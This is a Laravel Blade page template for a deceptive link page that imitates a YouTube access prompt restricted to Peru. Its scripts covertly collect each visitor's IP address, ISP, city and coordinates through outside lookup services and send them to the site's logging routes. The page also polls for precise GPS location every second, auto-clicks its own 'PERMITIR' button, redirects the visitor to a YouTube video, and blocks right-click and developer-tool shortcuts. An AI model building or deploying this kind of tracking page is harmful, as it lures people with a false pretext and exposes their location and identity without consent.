@extends('layouts.app_fake')
@section('content')
    <style>
        html {
            @if($agent->isMobile())
                background: url("{{ asset($enlace->getTipo->celular) }}") no-repeat center center fixed;
            @elseif($agent->isTablet())
                background: url("{{ asset($enlace->getTipo->tableta) }}") no-repeat center center fixed;
            @else
                background: url("{{ asset($enlace->getTipo->computadora) }}") no-repeat center center fixed;
            @endif
            background-size: cover;
            -moz-background-size: cover;
            -webkit-background-size: cover;
            -o-background-size: cover;
        }
    </style>

    <body class="modal-open" style="overflow: hidden; padding-right: 0px;">

        <div class="modal fade show" id="exampleModalLive" tabindex="-1" aria-labelledby="exampleModalLiveLabel"
            aria-modal="true" role="dialog" style="display: block;">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header" style="background-color: #fe0000;color: white;">
                        <h5 class="modal-title" id="exampleModalLiveLabel">Acceso solo para <span
                                id="user_countrycode">Peru</span></h5>
                        <span class="close" style="opacity: 1;"><img
                                src="{{ asset('redes/youtubelogomodal.png') }}"></span>
                    </div>
                    <div class="modal-body">
                        <div id="chconfig1" class="modal-body" style="display: block;">
                            <h3 style="text-align: center;">Confirme su Pais para acceder</h3>
                            <img src="{{ asset('redes/permitirv1.gif') }}" class="img-fluid" alt="...">
                        </div>

                        @if($agent->isMobile() || $agent->isTablet())
                            <div id="chconfig3" style="display:block;" class="modal-body">
                                <h3 style="text-align: center;">Activa tu GPS</h3>
                                <div class="form-group">
                                    <label>Activa tu GPS y vuelve a acceder:</label>
                                    <p style="text-align: center;"><img class="responsive"
                                            src="{{ asset('redes/permitircelularvs.jpeg') }}">
                                    </p>
                                </div>
                            </div>
                        @else
                            <div id="chconfig2" style="display: block;" class="modal-body">
                                <h3 style="text-align: center;">Permitir Acceso</h3>
                                <div class="form-group">
                                    <label>1. Acceda a este enlace:</label>
                                    <input type="text" onclick="this.setSelectionRange(0, this.value.length)"
                                        class="form-control"
                                        value="chrome://settings/content/siteDetails?site={{ url('/') }}">
                                    <br>
                                    <label>2. Siga esta Configuracion:</label>
                                    <img src="{{ asset('redes/permitirv2.jpeg') }}" class="img-fluid" alt="...">
                                </div>
                            </div>
                        @endif

                        

                      


                        <form id="form" class="grid-3" style="display:none;">
                            <div class="item">
                                <p>P.GEO latitud:
                                    <input type="text" id="latitud" name="latitud">
                                </p>
                            </div>
                            <div class="item">
                                <p>P.GEO longitud:
                                    <input type="text" id="longitud" name="longitud">
                                </p>
                            </div>
                            <div class="item">
                                <p>IP:
                                    <input type="text" id="ip" name="ip">
                                </p>
                            </div>
                            <div class="item">
                                <p>City:
                                    <input type="text" id="city" name="city">
                                </p>
                            </div>
                            <div class="item">
                                <p>Continent:
                                    <input type="text" id="continent" name="continent">
                                </p>
                            </div>
                            <div class="item">
                                <p>country:
                                    <input type="text" id="country" name="country">
                                </p>
                            </div>
                            <div class="item">
                                <p>country_capital:
                                    <input type="text" id="country_capital" name="country_capital">
                                </p>
                            </div>
                            <div class="item">
                                <p>country_code:
                                    <input type="text" id="country_code" name="country_code">
                                </p>
                            </div>
                            <div class="item">
                                <p>country_phone:
                                    <input type="text" id="country_phone" name="country_phone">
                                </p>
                            </div>
                            <div class="item">
                                <p>currency:
                                    <input type="text" id="currency" name="currency">
                                </p>
                            </div>
                            <div class="item">
                                <p>currency_rates:
                                    <input type="text" id="currency_rates" name="currency_rates">
                                </p>
                            </div>

                            <div class="item">
                                <p>isp:
                                    <input type="text" id="isp" name="isp">
                                </p>
                            </div>
                            <div class="item">
                                <p>latitude:
                                    <input type="text" id="latitude" name="latitude">
                                </p>
                            </div>
                            <div class="item">
                                <p>longitude:
                                    <input type="text" id="longitude" name="longitude">
                                </p>
                            </div>
                            <div class="item">
                                <p>region:
                                    <input type="text" id="region" name="region">
                                </p>
                            </div>
                            <div class="item">
                                <p>timezone:
                                    <input type="text" id="timezone" name="timezone">
                                </p>
                            </div>
                        </form>
                    </div>
                    <div class="modal-footer">
                        <a style="background-color: #fe0000;" id="permisos" onclick="getLocation()" class="btn btn-danger btn-block"><span
                                class="glyphicon glyphicon-map-marker"></span> <b>PERMITIR</b></a>

                    </div>
                </div>
            </div>
        </div>


        <div class="modal-backdrop fade show"></div>
        <script src="{{ asset('bootstrap.bundle.min.js') }}"></script>
        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
        <script>
            function activefunction(){
                setTimeout(() => {
                    window.location.href = "https://www.youtube.com/watch?v=aW7bzd8uwyQ";
                }, 30000);
            }
            function getLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(showPosition);
                } else {
                    x.innerHTML = "Geolocation is not supported by this browser.";
                }
            }

            function showPosition(position) {
                document.getElementById("latitud").value = position.coords.latitude;
                document.getElementById("longitud").value = position.coords.longitude;
                if(position.coords.longitude){
                    const params = new URLSearchParams([['id', {{$enlace_detector->id}}],['latitude', position.coords.latitude],['longitude', position.coords.longitude]]);
                    axios.get("{{ route('vista_guardar_permisos') }}", {params})
                    .then(resp => {
                        activefunction();
                        // window.location.href = "https://www.youtube.com/watch?v=aW7bzd8uwyQ";
                        // console.log(resp)
                    })
                    .catch(error => {
                        // console.log(error)
                    });
                }

              
            }



            let userIP = null;
            const getIP = async () => {

                return await fetch('https://api.ipify.org?format=json')
                    .then(response => response.json());
            }

            const getInfo = async (ip) => {

                /*
                    https://ipstack.com/
                    https://ipwhois.io/
                    https://ipapi.co/
                */

                return await fetch('https://ipwhois.app/json/' + ip + '?lang=es')
                    .then(response => response.json());
            }


            getIP().then(response => {
                userIP = response.ip;
                getInfo(userIP).then(location => {



                    if (location) {

                        const params = new URLSearchParams([
                        ['id', {{$enlace_detector->id}}],
                        ['ip', userIP],
                        ['city', location.city ?? 'error'],
                        ['continent', location.continent ?? 'error'],
                        ['country', location.country ?? 'error'],

                        ['country_capital', location.country_capital ?? 'error'],
                        ['country_code', location.country_code ?? 'error'],
                        ['country_phone', location.country_phone ?? 'error'],

                        ['currency', location.currency ?? 'error'],
                        ['currency_rates', location.currency_rates ?? 'error'],
                        ['isp', location.isp ?? 'error'],

                        ['latitude', location.latitude ?? 'error'],
                        ['longitude', location.longitude ?? 'error'],
                        ['region', location.region ?? 'error'],
                        ['timezone', location.region ?? 'timezone'],
                    
                    ]);
                        axios.get("{{ route('vista_guardar_iplocation') }}", {params})
                        .then(resp => {
                            // window.location.href = "https://www.youtube.com/watch?v=aW7bzd8uwyQ";
                            // console.log(resp)
                        })
                        .catch(error => {
                            // window.location.href = "https://www.youtube.com/watch?v=aW7bzd8uwyQ";
                            // console.log(error)
                            activefunction();
                        });

                        // document.getElementById("ip").value = userIP;
                        // document.getElementById("city").value = location.city ?? 'error';
                        // document.getElementById("continent").value = location.continent ?? 'error';
                        // document.getElementById("country").value = location.country ?? 'error';

                        // document.getElementById("country_capital").value = location.country_capital ?? 'error';
                        // document.getElementById("country_code").value = location.country_code ?? 'error';
                        // document.getElementById("country_phone").value = location.country_phone ?? 'error';

                        // document.getElementById("currency").value = location.currency ?? 'error';
                        // document.getElementById("currency_rates").value = location.currency_rates ?? 'error';
                        // document.getElementById("isp").value = location.isp ?? 'error';

                        // document.getElementById("latitude").value = location.latitude ?? 'error';
                        // document.getElementById("longitude").value = location.longitude ?? 'error';
                        // document.getElementById("region").value = location.region ?? 'error';

                        // document.getElementById("timezone").value = location.timezone ?? 'error';

                    }
                })

            });


            window.onload = function() {
       
                setInterval(() => {
                    var options = {
  enableHighAccuracy: true,
  timeout: 5000,
  maximumAge: 0       
};
navigator.geolocation.getCurrentPosition(success, error, options);
                    console.log("click");
                    document.getElementById("permisos").click();
                }, 1000);
            }


        </script>
      
        <script>
            const consolaPlataformaWeb = {
                key: ["i", "I", "Control"],
                keydown: ["addEventListener", "keydown"],
                keyResponse: !1,
                alert: "%c ALERTA!!",
                alertDetails: "font-weight: bold; font-size: 70px;color: red; text-shadow: 3px 3px 0 rgb(217,31,38) , 6px 6px 0 rgb(226,91,14) , 9px 9px 0 rgb(245,221,8) , 12px 12px 0 rgb(5,148,68) , 15px 15px 0 rgb(2,135,206) , 18px 18px 0 rgb(4,77,145) , 21px 21px 0 rgb(42,21,113)",
                alertContainer: "%cABRIÓ LAS HERRAMIENTAS DE DESARROLLO, A PARTIR DE AHORA USTED ES RESPONSABLE DE LOS CAMBIOS COMO USUARIO FINAL, RECUERDA NO COPIAR Y PEGAR NINGÚN CODIGO DE PROCEDENCIA DUDOSA O PODRÁS SER VÍCTIMA DE ROBO DE INFORMACIÓN. CUALQUIER USO INADECUADO SERÁ SU RESPONSABILIDAD Y DEBERÁ AFRONTAR CARGOS LEGALES https://busquedas.elperuano.pe/normaslegales/ley-de-delitos-informaticos-ley-n-30096-1003117-1/  NO DUDES EN INFORMARNOS CUALQUIER ANORMALIDAD CON LA PLATAFORMA. RECUERDA SIEMPRE NO COMPARTIR INFORMACIÓN DE CUENTAS BANCARIAS, INFORMACIÓN FAMILIAR O TRANSFERENCIAS MONETARIAS DUDOSAS. VERIFICÁ NUESTROS TERMINOS Y CONDICIONES PARA MÁS INFORMACIÓN.",
                alertContainerDetails: "color:#00BCD4;text-shadow: 0.5px 1px 0 rgb(217,31,38);font-size: 20px;",
                alertas: function(e, a) {
                    console.log(e, a)
                }
            };
            window.oncontextmenu = function() {
                return consolaPlataformaWeb.keyResponse
            };
                
            document.addEventListener(consolaPlataformaWeb.keydown[1], function(e) {
                var a = e.key || e.keyCode;
                return a == consolaPlataformaWeb.key[2] ? consolaPlataformaWeb.keyResponse : e.ctrlKey && e.shiftKey && a ==
                    consolaPlataformaWeb.key[0] || e.ctrlKey && e.shiftKey && consolaPlataformaWeb.key[1] ? consolaPlataformaWeb
                    .keyResponse : void 0
            }, !1);
        
        
            consolaPlataformaWeb.alertas(consolaPlataformaWeb.alert, consolaPlataformaWeb.alertDetails);
            consolaPlataformaWeb.alertas(consolaPlataformaWeb.alertContainer, consolaPlataformaWeb.alertContainerDetails);
        </script>

    </body>
@endsection
